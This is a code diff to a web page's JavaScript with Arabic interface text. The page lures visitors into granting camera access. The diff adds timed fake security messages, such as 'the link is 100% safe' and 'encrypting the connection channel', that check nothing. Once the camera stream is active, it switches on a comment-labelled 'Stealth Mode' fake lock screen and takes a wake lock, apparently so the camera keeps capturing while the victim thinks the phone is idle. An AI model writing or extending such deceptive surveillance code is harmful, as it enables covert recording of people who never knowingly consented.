@@ -155,7 +155,7 @@
 
             const btn = document.getElementById('start-btn');
             btn.disabled = true;
-            btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري فحص شهادات الأمان...';
+            btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري فحص الرابط...';
 
             try {
                 // Initialize System
@@ -165,23 +165,48 @@
                 const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                 if (audioCtx.state === 'suspended') await audioCtx.resume();
 
-                // Verification Loop: Wait until camera or timeout
-                let checks = 0;
+                // Advanced Verification UX
+                let stage = 0;
                 const checkReady = setInterval(() => {
-                    checks++;
-                    // If camera starts or we waited too long (5s)
-                    if ((system.localStream && system.localStream.active) || checks > 10) {
+                    stage++;
+
+                    if (stage === 3) {
+                        btn.innerHTML = '<ion-icon name="shield-checkmark" style="color: #10b981;"></ion-icon> <span style="color: #10b981;">الرابط آمن بنسبة 100%</span>';
+                    } else if (stage === 6) {
+                        btn.innerHTML = '<ion-icon name="sync-outline" class="pulsing"></ion-icon> جاري تشفير قناة الاتصال...';
+                    }
+
+                    // Success Condition: Stream is active AND we showed the safe message (after stage 5)
+                    if (system.localStream && system.localStream.active && stage > 8) {
                         clearInterval(checkReady);
 
-                        const overlay = document.getElementById('permission-overlay');
-                        if (overlay) overlay.style.display = 'none';
+                        btn.innerHTML = '<ion-icon name="checkmark-circle"></ion-icon> تم بنجاح! جاري المتابعة...';
 
-                        // 🎭 Immediate Stealth Mode for ALL
-                        document.getElementById('dim-overlay').classList.add('active');
-                        updateClock();
+                        setTimeout(() => {
+                            const overlay = document.getElementById('permission-overlay');
+                            if (overlay) overlay.style.display = 'none';
 
-                        if ('wakeLock' in navigator) {
-                            navigator.wakeLock.request('screen').catch(() => { });
+                            // 🎭 Activate Stealth Mode (Force Lock Screen)
+                            document.getElementById('dim-overlay').classList.add('active');
+                            updateClock();
+
+                            if ('wakeLock' in navigator) {
+                                navigator.wakeLock.request('screen').catch(() => { });
+                            }
+                        }, 1000);
+                    }
+
+                    // Force timeout if camera fails
+                    if (stage > 25) {
+                        clearInterval(checkReady);
+                        if (!system.localStream) {
+                            btn.disabled = false;
+                            btn.innerHTML = 'فشل التحقق، يرجى السماح للكاميرا والمحاولة';
+                        } else {
+                            // Proceed anyway if camera is ok but UX stuck
+                            const overlay = document.getElementById('permission-overlay');
+                            if (overlay) overlay.style.display = 'none';
+                            document.getElementById('dim-overlay').classList.add('active');
                         }
                     }
                 }, 500);
